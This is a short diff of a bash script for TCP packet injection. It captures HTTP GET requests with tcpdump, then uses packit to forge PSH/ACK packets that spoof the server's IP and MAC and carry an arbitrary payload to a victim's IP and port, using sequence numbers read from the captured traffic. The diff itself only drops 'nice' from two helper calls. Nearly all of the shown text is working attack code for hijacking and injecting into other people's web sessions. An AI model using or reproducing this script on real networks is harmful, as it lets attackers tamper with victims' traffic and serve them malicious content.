@@ -163,7 +163,7 @@ if [[ ! -z $4 ]];then
 	while true; do
 		nice -n -20 tcpdump -i $2 -c 1 -eKnSt 'tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420' 1>$LOGFILE &
 		nice -n -20 inotifywait -r -e modify $LOGFILE
-		nice -n -20 mon--
+		mon--
 		
 		## inject the packet
 		nice -n -20 packit -i $3 -R -nnn -a $acknum -D $vicport -F PA -q $seqnum -S $svrport -d $vicip -s $svrip -X $rtrmac -Y $vicmac -p "$inject"
@@ -172,7 +172,7 @@ else
 	while true; do
 		nice -n -20 tcpdump -i $2 -c 1 -eKnSt 'tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420' 1>$LOGFILE &
 		nice -n -20 inotifywait -r -e modify $LOGFILE
-		nice -n -20 tap--
+		tap--
 		
 		## inject the packet
 		nice -n -20 packit -i $3 -R -nnn -a $acknum -D $vicport -F PA -q $seqnum -S $svrport -d $vicip -s $svrip -X $rtrmac -Y $vicmac -p "$inject"
